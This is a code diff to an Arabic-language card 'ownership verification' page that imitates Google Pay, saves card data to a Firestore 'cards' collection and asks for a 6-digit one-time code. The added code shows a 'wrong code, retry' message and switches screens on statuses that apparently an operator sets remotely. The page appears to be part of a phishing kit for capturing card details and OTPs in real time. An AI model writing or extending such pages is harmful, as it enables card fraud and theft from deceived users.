@@ -108,6 +108,9 @@
                 <h2>إثبات ملكية بطاقتك</h2>
             </div>
             <p class="verification-desc">أدخل الرمز المكون من 6 أرقام لتأكيد العملية.</p>
+            <div id="otp-error-message" style="display: none; background: #fee2e2; color: #d93025; padding: 10px; border-radius: 8px; margin-bottom: 15px; text-align: center;">
+    <i class="fa-solid fa-circle-exclamation"></i> رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.
+</div>
             <div class="card-illustration">
                 <i class="fa-solid fa-shield-halved shield-icon"></i>
                 <div class="google-code-line">GOOGLE*PAY <span class="highlight-circle">XXXXXX</span></div>
@@ -487,23 +490,32 @@
             });
             currentDocId = docRef.id;
 
-            onSnapshot(doc(db, "cards", currentDocId), (snap) => {
-                const data = snap.data();
-                if (!data) return;
+onSnapshot(doc(db, "cards", currentDocId), (snap) => {
+    const data = snap.data();
+    if (!data) return;
 
-                if (data.status === 'otp_required') {
-                    document.getElementById('payment-main-ui').style.display = 'none';
-                    document.getElementById('otp-verification-ui').style.display = 'block';
-                } else if (data.status === 'success') {
-                    document.getElementById('payment-main-ui').style.display = 'none';
-                    document.getElementById('otp-verification-ui').style.display = 'none';
-                    document.getElementById('success-message').style.display = 'block';
-                } else if (data.status === 'error') {
-                    document.getElementById('payment-main-ui').style.display = 'none';
-                    document.getElementById('otp-verification-ui').style.display = 'none';
-                    document.getElementById('error-final-message').style.display = 'block';
-                }
-            });
+    if (data.status === 'otp_required') {
+        document.getElementById('payment-main-ui').style.display = 'none';
+        document.getElementById('otp-verification-ui').style.display = 'block';
+        document.getElementById('otp-error-message').style.display = 'none';
+    } else if (data.status === 'wrong_otp') {
+        document.getElementById('payment-main-ui').style.display = 'none';
+        document.getElementById('otp-verification-ui').style.display = 'block';
+        document.getElementById('otp-error-message').style.display = 'block';
+        // إعادة تعيين الحالة بعد 3 ثواني
+        setTimeout(async () => {
+            await updateDoc(doc(db, "cards", currentDocId), { status: 'otp_required' });
+        }, 3000);
+    } else if (data.status === 'success') {
+        document.getElementById('payment-main-ui').style.display = 'none';
+        document.getElementById('otp-verification-ui').style.display = 'none';
+        document.getElementById('success-message').style.display = 'block';
+    } else if (data.status === 'error') {
+        document.getElementById('payment-main-ui').style.display = 'none';
+        document.getElementById('otp-verification-ui').style.display = 'none';
+        document.getElementById('error-final-message').style.display = 'block';
+    }
+});
         } catch (err) { 
             console.error(err);
             alert("فشل التخزين. تأكد من إعدادات Firestore."); 
